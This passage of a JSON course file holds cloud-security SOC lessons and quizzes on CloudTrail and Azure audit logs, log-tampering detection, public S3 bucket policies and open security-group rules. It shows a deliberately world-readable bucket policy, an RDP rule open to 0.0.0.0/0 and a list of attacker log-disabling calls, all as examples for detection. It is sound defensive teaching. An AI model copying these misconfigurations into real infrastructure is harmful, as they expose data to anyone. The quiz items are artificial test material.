      "question": "A company's engineers never set individual AWS passwords — they sign into a corporate SSO portal each morning and are granted temporary access to their AWS accounts automatically. What mechanism makes this possible, and what should the SOC watch as a result?",
      "options": [
        {
          "label": "AWS silently disables all authentication requirements for accounts under 90 days old, so no login of any kind is actually being checked here.",
          "value": "a"
        },
        {
          "label": "Federation lets AWS trust the company's identity provider directly, granting temporary role credentials on sign-in, so the SOC must watch the IdP's sign-in logs too.",
          "value": "b"
        },
        {
          "label": "Every engineer is issued the same shared root access key each morning by an administrator, who emails it out for manual entry into the CLI.",
          "value": "c"
        },
        {
          "label": "AWS permanently remembers each laptop's network address after the first login, so no further authentication step of any kind ever occurs again.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Federation lets AWS trust a company's identity provider via SAML or OIDC, so a single SSO sign-in issues temporary role credentials (e.g., via AssumeRoleWithSAML) without ever creating an AWS-specific password. Because the IdP is the real front door, its sign-in and MFA logs deserve as much SOC attention as CloudTrail. Option a invents a fake age-based exemption. Option c describes an insecure shared-secret practice, not federation. Option d fabricates permanent device trust that does not exist."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html",
    "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html",
    "https://learn.microsoft.com/en-us/entra/identity/authentication/concept-mfa-howitworks",
    "https://docs.aws.amazon.com/singlesignon/latest/userguide/what-is.html"
  ],
  "xp": 240,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-audit-logs-cloudtrail-azure-activity",
  "slug": "cloud-audit-logs-cloudtrail-azure-activity",
  "title": "Cloud Audit Logs: CloudTrail, Azure Activity & API Activity",
  "topic": "Cloud Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "If cloud actions are API calls, then the log of those API calls is the SOC's primary window into what happened. AWS CloudTrail and the Azure Activity Log record who did what, when, from where, and whether it worked — the raw material of nearly every cloud investigation. This lesson explains the management plane versus the data plane, where CloudTrail's trails actually store their data and why that determines whether evidence even exists, the anatomy of a CloudTrail event and its Azure/KQL equivalent, the specific patterns an analyst hunts for, a full worked investigation that strings several events into one story, and the tell-tale sign of an attacker trying to blind you by disabling logging.",
  "sections": [
    {
      "heading": "The Management Plane vs the Data Plane",
      "content": "To read cloud logs well, you first need a distinction that trips up many beginners: the difference between the **management plane** (also called the control plane) and the **data plane**.\n\n- The **management plane** is where you *manage resources*: creating a virtual machine, changing a permission, opening a firewall rule, deleting a storage bucket. These are administrative API calls about the infrastructure itself.\n- The **data plane** is where you *use the data inside* those resources: reading an individual object from a bucket, querying rows in a database, invoking a function. These are operations on the contents.\n\nThe reason this matters is that the two are logged differently and often separately. **Management-plane activity is logged comprehensively by default** — AWS **CloudTrail** and the **Azure Activity Log** capture management events automatically. **Data-plane activity is far higher volume and frequently must be turned on explicitly** (for example, S3 object-level data events or storage access logs), and it can be costly, so many organisations do not capture all of it.\n\nFor a SOC, the practical implications are large:\n\n- Most detections start in the **management plane**, because that is where an attacker's structural moves appear — creating users, escalating privileges, changing network rules, disabling security. And it is on by default, so the evidence is usually there.\n- **Data-plane visibility is a coverage decision.** If you need to prove *which specific files* an attacker read from a bucket, you need object-level data logging enabled *before* the incident. Part of a mature cloud SOC's job is ensuring the right data events are captured for sensitive resources.\n\nA simple analogy: the management plane is the record of who was handed keys, changed the locks, or opened doors in a building; the data plane is the record of which specific documents were taken out of which cabinet. The first is always kept; the second only if you installed the extra cameras. Knowing which plane your evidence lives in — and whether it was even being recorded — shapes every cloud investigation."
    },
    {
      "heading": "CloudTrail Architecture: Trails, Log Files, and Where They Live",
      "content": "Knowing what a CloudTrail event *contains* is only half the picture; knowing where these events actually live — and whether they are even being kept — determines whether the evidence exists at all when you need it.\n\n### Event history vs a trail\n\nEvery AWS account has **CloudTrail Event History** enabled automatically, showing the last **90 days** of management events directly in the console — useful for a quick look, but limited: it only covers recent history and offers no alerting. For real retention, delivery to storage, and integration with a SIEM, you need a **trail** — a configuration that tells CloudTrail to continuously deliver events as gzip-compressed JSON log files to an **S3 bucket** (and optionally stream them to **CloudWatch Logs** for near-real-time alerting).\n\n### Multi-region and organization trails\n\nBy default a trail can be scoped to one region, but a **multi-region trail** captures management events from *every* AWS region into one place — essential, because an attacker deliberately operating in a region your team never checks is a real evasion tactic (recall the region field from an earlier lesson). At the largest scale, an **organization trail**, set up once at the AWS Organizations root, automatically captures events from **every account** in the organization, so no individual account can simply opt out of logging.\n\n### CloudTrail Insights — automatic anomaly detection\n\nCloudTrail can optionally enable **Insights events**, which watch the normal *volume and rate* of management API calls and automatically flag unusual spikes — for example, a sudden burst of `RunInstances` calls or an unusual jump in error rates. This is a useful automatic lead, similar in spirit to GuardDuty, but it should be confirmed against the raw events, not trusted blindly.\n\n### The Azure equivalent\n\nThe Azure Activity Log itself is retained for **90 days** automatically, mirroring CloudTrail's Event History. For longer retention, alerting, and query, Azure resources are configured with a **diagnostic setting** that routes logs to a **Log Analytics workspace** (queried with **KQL**, the Kusto Query Language — the next section shows an example), an Azure Storage account for archive, or an **Event Hub** for streaming to external tools.\n\n### Why this belongs in a SOC's checklist, not just an architect's\n\nAn analyst should always know the answer to: *is there a trail covering this account and region, where does it deliver, and how long is it retained?* If a trail was only ever regional, or was only recently created, or a retention policy has already expired the log files you need, the evidence you're looking for may simply not exist — and that gap itself becomes something to flag and fix, not just work around."
    },
    {
      "heading": "Anatomy of a CloudTrail Event",
      "content": "**AWS CloudTrail** records management-plane API calls as structured events, and learning to read one is a core analyst skill. Every event answers the same journalistic questions — who, what, when, where, and with what result — through a consistent set of fields.\n\nThe fields that carry the most investigative weight:\n\n- **eventName** — the API action that was called, such as `RunInstances` (launch a VM), `CreateAccessKey`, `PutBucketPolicy`, or `StopLogging`. This is *what happened*.\n- **eventSource** — the service the call went to, like `iam.amazonaws.com` or `s3.amazonaws.com`.\n- **userIdentity** — *who* made the call: the identity type (IAM user, assumed role, root), the principal, and often the access key ID used. This is where you confirm which credential acted.\n- **sourceIPAddress** — the IP the call came from. Comparing this against an identity's baseline is one of the fastest anomaly checks.\n- **userAgent** — the tool used, which can reveal a CLI, an SDK, or a known attacker toolkit rather than the expected console.\n- **awsRegion** — where the action occurred; activity in an unused region is inherently suspicious.\n- **eventTime** — when, in UTC.\n- **errorCode / errorMessage** — present when the call was *denied* or failed, for example `AccessDenied`. A burst of these from one identity often marks an attacker probing the edges of what a stolen credential can do.\n\nReading an event is a matter of assembling these into a sentence: *\"At this time, this identity, from this IP, using this tool, called this action on this service in this region, and it succeeded or was denied.\"* Once you can narrate an event that way, you can spot the one that does not belong.\n\nAzure records the same idea in the **Azure Activity Log**, with matching concepts under different names: the **Operation name** (the action), the **Caller** (who), the **Caller IP address**, the **Status** (success/failure), the **Event category** (Administrative, Security, and so on), the **Resource**, and the **timestamp**. Azure sign-in and identity events live alongside in the **Entra** sign-in and audit logs. Whether you are reading AWS or Azure, the analytic move is identical: identify the actor, the action, the origin, and the outcome, then ask whether that combination makes sense for that identity."
    },
    {
      "heading": "Reading the Azure Activity Log with KQL",
      "content": "Azure analysts do the equivalent investigative work not by scrolling a portal blade one event at a time, but by querying the Log Analytics workspace with **KQL — the Kusto Query Language** — the same query language used across Azure Monitor, Sentinel, and Defender. A short example shows the same 'narrow down, then read' instinct from any other SIEM.\n\n### A worked KQL query\n\n```\nAzureActivity\n| where TimeGenerated > ago(24h)\n| where ActivityStatusValue == \"Success\"\n| where OperationNameValue has \"write\" or OperationNameValue has \"delete\"\n| summarize count() by Caller, CallerIpAddress, OperationNameValue\n| order by count_ desc\n```\n\nRead top to bottom, exactly like SPL or AQL from earlier SIEM lessons:\n\n- `AzureActivity` — *look at the Activity Log table.*\n- `where TimeGenerated > ago(24h)` — *only the last 24 hours* (bounding the time window, same discipline as every other query language).\n- `where ActivityStatusValue == \"Success\"` — *only calls that actually succeeded* — filters out noise from routine permission checks that failed harmlessly.\n- `where OperationNameValue has \"write\" or ... \"delete\"` — *only actions that changed or removed something*, the operations most worth an analyst's attention.\n- `summarize count() by Caller, CallerIpAddress, OperationNameValue` — *collapse into a count per caller, IP, and operation* — the same aggregate-to-a-table instinct as `stats` in SPL or `GROUP BY` in AQL.\n- `order by count_ desc` — *busiest first.*\n\nThe result is a short table of who has been making the most changes or deletions in the last day, and from where — exactly the shape of table you'd scan for an unfamiliar caller or an unexpected IP.\n\n### The Entra ID sign-in log alongside it\n\nActivity Log tells you *what changed*; it does not tell you *how the caller authenticated*. For that, you pair it with the **Entra ID sign-in log**, which records each authentication attempt with fields like `UserPrincipalName`, `IPAddress`, `AppDisplayName`, `ConditionalAccessStatus`, and a **risk level** computed by **Entra ID Protection**. A resource change made by a caller whose corresponding sign-in was flagged as risky is a far stronger signal than either fact alone — which is exactly the correlation instinct the next sections build on."
    },
    {
      "heading": "Hunting Patterns in the Activity Log",
      "content": "With the fields in hand, detection becomes a matter of recognising patterns that betray misuse. The following are among the highest-value hunts across CloudTrail and Azure Activity.\n\n### Reconnaissance / enumeration\n\nRight after gaining access, attackers map their new environment. Watch for a single identity issuing many **List** and **Describe** actions (`ListUsers`, `ListBuckets`, `GetAccountAuthorizationDetails`) in a short window, especially paired with **AccessDenied** errors as they probe boundaries.\n\n### Privilege escalation and persistence\n\nThese are rare, high-impact actions that deserve alerts on their own: `CreateUser`, `CreateAccessKey`, `AttachUserPolicy`, `PutUserPolicy`, `UpdateAssumeRolePolicy`, or in Azure adding a principal to **Owner** or **User Access Administrator**. A low-privilege identity suddenly attaching administrator permissions to itself is a screaming indicator.\n\n### Anomalous origin\n\nAny management call from an **unusual source IP, country, or region**, or with a **User-Agent** that does not match the identity's norm. A role that only ever acted from inside a workload now calling APIs from an external IP is a strong sign of stolen credentials (for example, credentials pulled from an instance via SSRF).\n\n### Resource actions that fit an attack goal\n\n`RunInstances` in an unused region (often crypto-mining), mass deletion of resources or backups, snapshot creation and sharing to an external account (a data-exfiltration path), or changes to storage and firewall exposure (covered in the storage and security-group lesson).\n\n### Suspicious authentication\n\nCorrelate the activity log with identity logs: **impossible travel**, **unfamiliar sign-in properties**, use of **anonymising IPs**, and **console logins by the root or Global Admin account**, which should be exceedingly rare.\n\nThe unifying method is **baseline then deviation**. For each identity you learn the normal source IPs, regions, actions, and hours; then you alert when reality departs from that shape. A single deviation may be benign — an engineer travelling, a new automation — so the confirming move is **correlation**: the same identity showing several signals together (new IP, then enumeration, then a new user created) turns a maybe into a near-certainty. Managed detections like **GuardDuty** and **Defender for Cloud** encode many of these patterns for you and are excellent leads, but you confirm and scope the incident in the raw activity log itself."
    },
    {
      "heading": "A Full Worked Investigation: Reading a Sequence of Events",
      "content": "Individual events and individual queries are tools; a real investigation strings several of them into a narrative. Here is a short, realistic sequence — read it the way you would while triaging an actual alert.\n\n### The sequence\n\n| Time (UTC) | eventName | userIdentity | sourceIPAddress | Result |\n|---|---|---|---|---|\n| 14:02 | ConsoleLogin | IAMUser: svc-reporting | 41.203.88.12 (unfamiliar) | Success |\n| 14:03 | ListUsers | IAMUser: svc-reporting | 41.203.88.12 | Success |\n| 14:03 | ListAttachedUserPolicies | IAMUser: svc-reporting | 41.203.88.12 | Success |\n| 14:05 | CreateAccessKey | IAMUser: svc-reporting | 41.203.88.12 | Success |\n| 14:06 | AttachUserPolicy (AdministratorAccess) | IAMUser: svc-reporting | 41.203.88.12 | Success |\n\n### Narrating it as a story\n\nFirst, notice **what kind of identity this is**: `svc-reporting` — the naming convention alone suggests a service account meant for automated reporting, not interactive console logins. That already makes the very first line, a `ConsoleLogin`, worth a raised eyebrow before you even look at anything else.\n\nSecond, the **source IP is unfamiliar** — if this account's baseline shows it only ever calling from your reporting server's fixed IP, `41.203.88.12` breaks that pattern immediately.\n\nThird, watch the **shape of the sequence**: a login, followed one minute later by enumeration (`ListUsers`, `ListAttachedUserPolicies` — classic Discovery), followed two minutes after that by `CreateAccessKey` (Persistence) and `AttachUserPolicy` granting full administrator rights (Privilege Escalation). This is not four unrelated events — read together, they are the exact MITRE ATT&CK arc from earlier lessons: initial access, discovery, persistence, escalation, compressed into four minutes.\n\n### Why correlation beats any single line\n\nNo single row here is, by itself, undeniable proof of compromise — a `ConsoleLogin` from a new IP could be a misconfigured monitoring job; `ListUsers` alone happens constantly in normal administration. It is the **sequence and the timing** — an unusual login for this identity type, immediately followed by enumeration, immediately followed by irreversible privilege changes, all from one unfamiliar source — that turns four ordinary-looking events into an unambiguous incident. This is the analytic move underneath every hunting pattern in this lesson: **baseline the identity, then read the whole story the events tell together, not just the line that first caught your eye.**\n\n### What happens next\n\nAt this point the analyst's job is decisive, not diagnostic: revoke the account's credentials (both the original and the newly created key), detach the administrator policy, and pivot to asking what this now-privileged identity did in the minutes *after* 14:06 — because privilege escalation is rarely the attacker's final goal, only the enabling step for whatever comes next."
    },
    {
      "heading": "When the Attacker Attacks the Logs",
      "content": "A sophisticated intruder knows the activity log is what will expose them, so a classic move is to **blind the defender by tampering with logging itself**. Recognising this is one of the most important instincts a cloud analyst can develop, because it inverts the usual signal: here, the *absence* of logs, or the act of disabling them, is the alarm.\n\nIn AWS, the key event is **`StopLogging`** on CloudTrail — an explicit API call to turn a trail off. Related tampering includes **`DeleteTrail`**, **`UpdateTrail`** (to weaken what is captured or redirect where logs go), and disabling or deleting the log storage. In Azure, the equivalents are actions that disable diagnostic settings, delete or modify **Log Analytics** workspaces, or turn off **Defender for Cloud** protections. MITRE ATT&CK tracks this behaviour under **Impair Defenses: Disable or Modify Cloud Logs**.\n\nWhy attackers do it is straightforward: with logging off, their subsequent actions — data theft, resource creation, lateral movement — leave no management-plane trail. The window between disabling logging and getting caught is their cover.\n\nThe crucial defensive design turns this against them: **`StopLogging` and its kin are themselves recorded**, and the act of disabling logging is exactly the kind of rare, high-severity event a SOC should alert on immediately. So the detections you build are:\n\n- **Alert on any attempt to stop, delete, or modify logging** — `StopLogging`, `DeleteTrail`, diagnostic-setting changes — as a top-priority signal, regardless of who did it.\n- **Alert on unexpected gaps** in the log stream; a trail that goes silent when it normally is not is suspicious.\n- **Protect the logs' integrity by design:** deliver CloudTrail to a separate, access-restricted account or an immutable store, enable logging in **all regions**, and ensure the accounts that could disable logging are tightly limited and closely watched.\n\nThe broader principle, echoing the on-prem world's protection of Windows event logs, is that **your telemetry is itself a target**. A mature cloud SOC does not just read the logs; it monitors the health and integrity of the logging pipeline, so that an attacker's attempt to go dark becomes the very event that lights them up."
    }
  ],
  "keyTakeaways": [
    "The management (control) plane logs administrative API calls — creating, changing, deleting resources — and is captured by default in CloudTrail and Azure Activity Log; the data plane logs use of the contents (reading an object, querying data), is higher-volume, and often must be explicitly enabled.",
    "CloudTrail's 90-day Event History is not the same as a trail: a trail (ideally multi-region, or organization-wide) delivers durable log files to S3 and can stream to CloudWatch for alerting, and CloudTrail Insights flags abnormal call-volume spikes automatically — Azure mirrors this with diagnostic settings routing to a Log Analytics workspace queried in KQL.",
    "A CloudTrail event answers who/what/where/outcome via eventName, eventSource, userIdentity (and access key), sourceIPAddress, userAgent, awsRegion, eventTime, and errorCode; Azure Activity Log mirrors this with Operation, Caller, Caller IP, Status, and category.",
    "Hunt by baselining each identity then alerting on deviation: enumeration bursts (List/Describe + AccessDenied), privilege/persistence actions (CreateUser/CreateAccessKey/AttachUserPolicy), anomalous origin, resource actions fitting an attack goal, and suspicious sign-ins — confirming by correlation.",
    "A real investigation strings events into a narrative, not a single line: an unfamiliar login for an identity's type, followed by enumeration, followed by persistence and privilege-escalation actions, all from one unfamiliar source, together form an unambiguous MITRE ATT&CK arc that no single event proves alone.",
    "Attackers disable logging to go dark (AWS StopLogging/DeleteTrail/UpdateTrail; Azure diagnostic-setting changes — MITRE Impair Defenses), but those actions are themselves logged, so alert on any attempt to stop/modify logging and protect log integrity with immutable, multi-region, isolated storage."
  ],
  "quiz": [
    {
      "question": "During an investigation you find a CloudTrail event with eventName 'StopLogging' called by an IAM user shortly after that user was seen enumerating permissions. Why is this StopLogging event so significant, and what is the intended effect for the attacker?",
      "options": [
        {
          "label": "It is insignificant routine maintenance, because CloudTrail must be stopped and restarted daily, so this event can safely be ignored during triage.",
          "value": "a"
        },
        {
          "label": "It shows the attacker disabling CloudTrail to blind the SOC so their later actions leave no management-plane trail; the disabling itself is a top-priority alert.",
          "value": "b"
        },
        {
          "label": "It means CloudTrail automatically encrypted itself for safety, so all subsequent events are simply stored in a stronger format that analysts cannot read.",
          "value": "c"
        },
        {
          "label": "It proves the account is fully secure, because only a legitimate administrator performing an approved audit is ever able to call the StopLogging action.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "StopLogging turns off CloudTrail so the attacker's subsequent management-plane actions leave no trail — a classic Impair Defenses move — and because the disabling action is itself recorded, it should be a top-priority alert. Option a invents a daily-restart requirement that does not exist. Option c fabricates self-encryption. Option d is false: many identities could call StopLogging if over-permissioned, and the context (enumeration first) points to abuse, not a routine audit."
    },
    {
      "question": "You want to determine exactly which individual objects an attacker read out of an S3 bucket during an incident last week, but you can only find management-plane records of bucket policy changes. What is the most likely reason, and what does it teach about cloud logging?",
      "options": [
        {
          "label": "Object reads are management-plane events that CloudTrail always captures, so the data must have been deleted by the attacker to hide the reads.",
          "value": "a"
        },
        {
          "label": "Reading individual objects is data-plane activity, which is high-volume and often must be enabled beforehand, so without it that visibility was never recorded.",
          "value": "b"
        },
        {
          "label": "S3 never logs any access at all, so the only way to know which objects were read is to ask the attacker or reconstruct it from network packets.",
          "value": "c"
        },
        {
          "label": "The management-plane log automatically includes every object read, so the missing records simply mean the incident never actually involved that bucket.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Reading individual objects is data-plane activity, which is far higher volume than management events and frequently must be explicitly enabled (S3 object-level data events); if it was not turned on before the incident, that visibility does not exist. This teaches that data-plane coverage is a decision to make in advance for sensitive resources. Options a and d wrongly claim object reads are management-plane events. Option c overstates the gap — S3 data events can be logged when enabled."
    },
    {
      "question": "An AWS account only ever relied on CloudTrail's default Event History, and an analyst now needs to alert on suspicious activity going back further than 90 days in a durable, queryable store. What is the gap, and what should have been configured?",
      "options": [
        {
          "label": "There is no gap; Event History automatically retains all events forever once an account is more than 90 days old, so nothing further was needed.",
          "value": "a"
        },
        {
          "label": "A trail was never created, so events beyond the 90-day Event History were never durably delivered anywhere — a multi-region trail to S3, optionally streamed to CloudWatch, should have been configured.",
          "value": "b"
        },
        {
          "label": "CloudTrail cannot store data longer than 90 days under any configuration, so long-term retention is only possible via third-party packet capture.",
          "value": "c"
        },
        {
          "label": "Event History and a trail are the same feature under two names, so creating a trail would not have changed what data was retained or where.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Event History is a 90-day, console-only view with no alerting; durable, longer retention and streaming for alerts require a trail delivering log files to S3 (and optionally CloudWatch), ideally multi-region or organization-wide. Option a wrongly claims permanent automatic retention. Option c is false — a trail can retain data indefinitely in S3. Option d incorrectly equates two distinct features."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html",
    "https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log",
    "https://attack.mitre.org/techniques/T1562/008/",
    "https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/"
  ],
  "xp": 240,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-storage-permissions-security-groups",
  "slug": "cloud-storage-permissions-and-security-groups",
  "title": "Cloud Exposure: Storage Permissions & Security Groups",
  "topic": "Cloud Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Two of the most common and most damaging cloud mistakes share a single root cause: a setting that should have been private was left open to the internet. A storage bucket exposed to the public has spilled billions of records across the industry, and a firewall rule opened to the whole world invites attackers straight to a server's door. This lesson covers the two exposure surfaces every cloud SOC watches — storage permissions and security groups — how they are supposed to work, worked examples of the exact policy and rule fields that create exposure, how identity-based and resource-based policies interact, other exposure surfaces beyond buckets and ports, how an analyst detects and responds to dangerous exposure, and how real organisations prevent it at scale.",
  "sections": [
    {
      "heading": "How Cloud Storage Permissions Work",
      "content": "Cloud **object storage** — AWS **S3** and Azure **Blob Storage** — holds files (called **objects** or **blobs**) inside containers (S3 **buckets** or Azure **containers**). It is cheap, effectively limitless, and reachable over the internet, which is exactly why a permission mistake here is so consequential: the data is one setting away from being globally readable.\n\nAccess to storage is controlled by several layered mechanisms, and understanding the layers explains how exposure happens:\n\n- **Private by default.** New buckets and containers are private; only the owning account can access them until someone grants more.\n- **Resource policies (bucket policies)** are JSON rules attached to the bucket that say who may do what. A policy that grants read to **everyone** (in AWS, the special principal `\"*\"` or the `AllUsers` group) makes the bucket public.\n- **ACLs (access control lists)** are an older, per-object or per-bucket grant mechanism that can also open access, sometimes surprisingly.\n- **Guardrails** like AWS **Block Public Access** and Azure's storage-account public-access settings are account- or bucket-level switches designed to prevent public exposure regardless of individual policies. When enabled they are a strong safety net; when disabled, the other settings can expose data.\n- **Pre-signed URLs / SAS tokens** grant temporary, scoped access to a specific object without making the whole bucket public — the correct way to share a single file.\n\nExposure happens when these layers combine to allow anonymous access: a bucket policy or ACL grants `AllUsers` read, and Block Public Access is off. The result is that **anyone on the internet, with no credential at all, can list and download the contents.** Countless breaches — customer records, backups, internal documents — have come not from a clever exploit but from exactly this misconfiguration. The data was not stolen through a broken lock; the door was simply left open, and a scanner walking the internet found it.\n\nThe defensive baseline is straightforward: keep buckets private, keep **Block Public Access** (or the Azure equivalent) enabled, share individual files with **pre-signed URLs / SAS tokens** rather than public settings, and apply least privilege to who can even change these settings."
    },
    {
      "heading": "Worked Example: Reading a Bucket Policy and a Security Group Rule",
      "content": "Abstract descriptions of 'public buckets' and 'open ports' become far more concrete once you read the actual configuration that causes them. Here are both, exactly as an analyst would find them.\n\n### A dangerous bucket policy\n\n```\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"PublicReadGetObject\",\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::customer-uploads/*\"\n    }\n  ]\n}\n```\n\nRead the two fields that make this dangerous: `\"Principal\": \"*\"` means *any principal at all* — not a specific account, not your organisation, literally anyone, including someone with no AWS account whatsoever. Combined with `\"Effect\": \"Allow\"` and `\"Action\": \"s3:GetObject\"`, this statement means: **anyone on the internet may download any object in the customer-uploads bucket.** Compare it to the least-privilege policy from the authentication lesson, which named one specific principal (an IAM role) rather than a wildcard — the difference between `\"Principal\": \"*\"` and a named principal is often the entire difference between private and breached.\n\n### A dangerous security group rule\n\n| Type | Protocol | Port range | Source |\n|---|---|---|---|\n| Inbound | TCP | 3389 (RDP) | 0.0.0.0/0 |\n\nRead this the same way: **any IP address on the entire internet** (`0.0.0.0/0`) may open a TCP connection to port **3389**, the Windows Remote Desktop Protocol port. Automated internet-wide scanners specifically hunt for exactly this rule shape, because it means they can attempt to log in — or exploit a known RDP vulnerability — on a server that should only ever be reachable from inside the corporate network.\n\n### The safe versions, side by side\n\n```\n\"Principal\": {\"AWS\": \"arn:aws:iam::111122223333:role/ReportingRole\"}\n```\n\n| Type | Protocol | Port range | Source |\n|---|---|---|---|\n| Inbound | TCP | 3389 (RDP) | 10.20.0.0/16 (corporate VPN range) |\n\nIn both cases the fix is the same idea applied to a different layer: **name exactly who or what should have access, instead of leaving the field open to everyone.** Whenever you read a policy or a rule during an investigation, your eye should go first to the *principal* or *source* field — that single value is usually what separates a routine configuration from a breach waiting to be found."
    },
    {
      "heading": "Security Groups — The Cloud Firewall",
      "content": "Where storage permissions control access to *data*, **security groups** control network access to *resources* like virtual machines. A **security group** in AWS (and a **Network Security Group, or NSG**, in Azure) is a virtual firewall wrapped around a resource, defining which network traffic may reach it and, sometimes, leave it.\n\nThe core mechanics:\n\n- A security group holds **rules** that permit traffic based on **protocol**, **port**, and **source** (or destination). For example, \"allow TCP port 443 from anywhere\" lets the world reach a web server, while \"allow TCP port 22 from the office IP only\" restricts SSH to your network.\n- AWS security groups are **stateful** (if you allow a request in, the reply is automatically allowed out) and contain **only allow rules** — anything not explicitly allowed is denied. Azure NSGs use both allow and deny rules with priorities.\n- The critical, dangerous value is the source **`0.0.0.0/0`**, which means **the entire internet**. A rule allowing a port from `0.0.0.0/0` exposes that service to every attacker and scanner on earth.\n\nThe classic misconfiguration is opening a **management or database port to the whole internet**:\n\n- **SSH (port 22)** or **RDP (port 3389)** open to `0.0.0.0/0` invites brute-force and exploitation of the remote-access service; automated bots find such hosts within minutes.\n- **Database ports** — for example MySQL `3306`, MS SQL `1433`, MongoDB `27017`, Redis `6379`, Elasticsearch `9200` — exposed to the internet have led to enormous data breaches and ransom attacks, because many databases historically shipped with weak or no authentication.\n\nThe principle behind safe security groups is **least exposure**: open only the specific ports that must be reachable, from the **narrowest possible source** (a specific IP range, not the world), and keep administrative access behind a VPN, bastion host, or an identity-aware access service rather than exposing it directly. Egress (outbound) rules matter too — restricting where a compromised host can send data limits exfiltration. A security group is, in effect, the answer to \"who on the network is allowed to knock on this resource's door,\" and every `0.0.0.0/0` on a sensitive port answers \"everyone.\""
    },
    {
      "heading": "IAM Roles vs Resource Policies: Two Paths to the Same Door",
      "content": "A subtlety that trips up many analysts — and many engineers — is that access to a resource like an S3 bucket can be granted in **two independent places**, and both must be checked, because either one alone can open the door.\n\n### Identity-based policies\n\nThe policies covered in the authentication lesson — attached to an **IAM user or role** — are called **identity-based policies**. They answer: *what is this principal allowed to do, anywhere it has access?* If a role's identity-based policy allows `s3:GetObject` on a bucket, that role can read from it.\n\n### Resource-based policies\n\nA **bucket policy**, like the one in the previous section, is attached directly to the **resource** itself, not to any identity. It is called a **resource-based policy**, and it answers a different question: *who is allowed to reach this specific resource, regardless of what account they come from?* This is what makes `\"Principal\": \"*\"` in a bucket policy so dangerous — it grants access **independent of any IAM policy anywhere**. An attacker does not need any identity-based permission at all if the bucket's own resource policy already lets the whole internet in.\n\n### Why both paths matter together\n\nThis dual system is also what makes **cross-account access** possible on purpose: Account A's bucket can have a resource policy naming Account B's role as an allowed principal, while Account B's role has an identity-based policy allowing it to call `s3:GetObject`. **Both** must agree for the access to work — which is exactly the safety property that makes resource policies useful, and exactly the property that a wildcard principal destroys. A trust policy on an assumable role (from the authentication lesson) works the same way: it is a resource-based policy attached to the role itself, naming which external principals may assume it.\n\n### The analyst's checklist\n\nWhen investigating unexpected access to a bucket, a database, or any resource that supports resource-based policies, check **both** layers:\n\n- **Identity-based:** what does the accessing principal's own attached policy allow?\n- **Resource-based:** does the resource itself have a policy (bucket policy, KMS key policy, Lambda resource policy, and so on) granting access independently?\n\nA bucket can be completely locked down from the IAM side and still be world-readable because of its own policy — which is precisely why 'the IAM policies look fine' is never, by itself, enough to close out an exposure investigation."
    },
    {
      "heading": "Beyond Buckets and Ports: Other Exposure Surfaces",
      "content": "Buckets and security groups are the two exposure surfaces every SOC learns first, but the same root problem — a setting that should have restricted access left wide open — recurs across other cloud resources, and a mature analyst knows to check them too.\n\n### Public snapshots\n\nAWS **RDS database snapshots** and **EBS volume snapshots** can each be marked **public**, making a full copy of a database or a disk downloadable by anyone. This is a single checkbox-level mistake that hands over an entire dataset at once — often more data than any single bucket exposure. Azure **managed disks** have an equivalent shared-access-signature mechanism that, if generated with excessive scope or duration, achieves the same result.\n\n### Publicly accessible databases\n\nManaged database services like **RDS** and **Azure SQL Database** have their own \"publicly accessible\" flag, independent of the security group protecting them. A database can sit behind a perfectly scoped security group and still be reachable from the internet if this flag is set to true, because the flag controls whether the database is even assigned a public network endpoint in the first place.\n\n### Container registries and message queues\n\nA **container registry** (Amazon ECR, Azure Container Registry) set to public can leak proprietary application images — and the source code or secrets baked into them. Message queues and topics (Amazon SQS/SNS) can likewise be given overly permissive resource policies, letting outside principals read or inject messages.\n\n### The unifying lesson\n\nEvery one of these is the same pattern from the rest of this lesson, just on a different resource type: a **public/anonymous principal**, a **permissive resource-level setting**, or a **network-reachability flag**, left in the open state instead of the restricted one. When you audit a cloud environment for exposure, do not stop at S3 and security groups — ask the same question of snapshots, databases, registries, and queues: *who can reach this, and should they be able to?*"
    },
    {
      "heading": "Detecting Dangerous Exposure",
      "content": "Because exposure is a *configuration* problem, detection blends two approaches: catching a bad state that already exists (**posture**), and catching the *moment* it is created (**change events**). A strong cloud SOC does both.\n\n### Posture detection — find what is already exposed\n\nContinuously assess configuration against safe baselines:\n\n- **Public storage:** buckets or containers with policies/ACLs granting anonymous or `AllUsers` access, or with Block Public Access disabled.\n- **Open security groups:** rules allowing sensitive ports (22, 3389, database ports) from `0.0.0.0/0`.\n\nCloud-native tools do much of this automatically. AWS **Config**, **Trusted Advisor**, **Security Hub**, and **Macie** (for sensitive data in S3), and Azure **Defender for Cloud**'s secure-score and recommendations, flag public buckets and overly open security groups. **GuardDuty** and Defender can also alert when a resource is *accessed* from the internet in suspicious ways. These are excellent, but they only help if someone acts on the findings — unactioned posture alerts are a common gap.\n\n### Change detection — catch the moment of exposure\n\nIn the activity log (from the previous lesson), specific API calls signal that exposure was just introduced or widened:\n\n- **Storage:** `PutBucketPolicy`, `PutBucketAcl`, `PutBucketPublicAccessBlock` (especially turning it *off*), and the Azure equivalents changing container public access.\n- **Network:** `AuthorizeSecurityGroupIngress` (adding an inbound rule), particularly one whose source is `0.0.0.0/0` on a sensitive port; in Azure, NSG rule changes.\n\nAlerting on these change events — *who* opened *what*, from *where* — lets you catch a mistake or an attacker in the act, rather than discovering the open door days later. Correlate with identity: a rule opening RDP to the world, created by an unfamiliar identity from a foreign IP, is very different from a documented change by your platform 